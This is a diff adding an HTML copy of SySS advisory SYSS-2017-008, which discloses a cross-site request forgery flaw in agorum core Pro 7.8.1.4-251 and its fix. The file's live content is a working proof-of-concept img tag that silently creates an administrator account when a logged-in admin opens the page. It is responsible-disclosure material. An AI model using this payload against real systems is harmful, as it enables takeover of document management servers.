@@ -1,0 +1,134 @@
+<!--
+Source: https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2017-008.txt
+
+Advisory ID: SYSS-2017-008
+Product: agorum core Pro
+Manufacturer: agorum Software GmbH
+Affected Version(s): 7.8.1.4-251
+Tested Version(s): 7.8.1.4-251
+Vulnerability Type: Cross-Site Request Forgery (CWE-352) 
+Risk Level: Medium
+Solution Status: Open
+Manufacturer Notification: 2017-02-06
+Solution Date: 2017-04-06
+Public Disclosure: 2017-04-12
+CVE Reference: Not yet assigned
+Author of Advisory: Sascha Grimmeisen & Dr. Erlijn van Genuchten, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+agorum core Pro is a module based Document Management System. It allows 
+the customer to buy only required modules and can be extended when 
+needed. 
+
+Due to missing protection mechanisms, the web application component is
+vulnerable to cross-site request forgery (CSRF) attacks.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The tested web application component offers no protection against cross-
+site request forgery (CSRF) attacks. This kind of attack forces end
+users respectively their web browsers to perform unwanted actions in a
+web application context in which they are currently authenticated.
+
+CSRF attacks specifically target state-changing requests, for example in
+order to enable or disable a feature, and not data theft, as an attacker
+usually has no possibility to see the response of the forged request.
+
+In general, CSRF attacks are conducted with the help of the victim, for 
+example by a user visiting an attacker-controlled URL sent by e-mail in 
+its web browser. Often, cross-site request forgery attacks make use of 
+cross-site scripting attacks, but this is not mandatory.
+
+CSRF attacks can also be performed against a web application if a victim
+is only visiting an attacker-controlled web server. In this case, the
+attacker-controlled web server is used to generate a specially crafted
+HTTP request in the context of the user's web browser which is then sent
+to the vulnerable target web application.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+The following HTML file containing a web form generates a simple crafted
+HTTP POST request that can be used to add an administration user to the
+web application in the context of an administrative user.
+
+PoC HTML file to add an administration user 'ADDEDUSER' with the password 
+'PASSWORD123':
+-->
+
+<html>
+  <body>
+    <img src="https://[HOST]/roiwebui/roiwebui_module/genericEditMaskSaveAction.do?interSaveIdent=&currentTabName=&attribute(name)=ADDEDUSER&attribute(aliases)=&attribute(credentialManager)=roi&attribute(passWord1)=PASSWORD123&attribute(passWord2)=PASSWORD123&attribute(adminEnabled)=on&attribute(description)=&attribute(familyName)=ADDEDUSER&attribute(givenName)=GmbH&attribute(emailAddress)=ADDEDUSER@EXAMPLE.COM&attribute(sendingEmailAddress)=&attribute(language)=de&attribute(mandatorIdentifier)=&attribute(defaultRole)=&attribute(associatedRole)=&folderId=1002356&portalTabNumber=1004&myTabNumber=1005&editMaskName=UserObjectEditMask&portalTabNumber=1004&attribute(selectedTab)=2">
+  </body>
+</html>
+
+<!--
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Update to agorum core 7.11.3. [4]
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2017-01-30: Vulnerability discovered
+2017-02-06: Vulnerability reported to manufacturer
+2017-04-06: Public disclosure
+2017-04-06: Fix confirmed by manufacturer
+2017-04-12: Vulnerability published
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Product website for agorum Software GmbH
+    http://mein-dms.agorum.com/
+[2] SySS Security Advisory SYSS-2017-008
+    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2017-008.txt
+[3] SySS Responsible Disclosure Policy
+    https://www.syss.de/en/news/responsible-disclosure-policy/
+[4] Agorum Change Log
+    https://d4w.agorum.com/roiwebui/files/520986548/Changelog.html
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Credits:
+
+This security vulnerability was found by Dr. Erlijn van Genuchten and 
+Sascha Grimmeisen of SySS GmbH.
+
+E-Mail: erlijn.vangenuchten@syss.de
+Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Erlijn_van_Genuchten.asc
+Key ID: 0xBD96FF2A
+Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
+
+E-Mail: sascha.grimmeisen@syss.de
+Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Sascha_Grimmeisen.asc
+Key ID: 0xD3D9C868
+Key Fingerprint: 4937 7FCF BA8E 3D80 1AAD 4AC4 7C1D E510 D3D9 C868
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclaimer:
+
+The information provided in this security advisory is provided "as is" 
+and without warranty of any kind. Details of this security advisory may
+be updated in order to provide as accurate information as possible. The
+latest version of this security advisory is available on the SySS Web
+site.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Copyright:
+
+Creative Commons - Attribution (by) - Version 3.0
+URL: http://creativecommons.org/licenses/by/3.0/deed.en
+-->
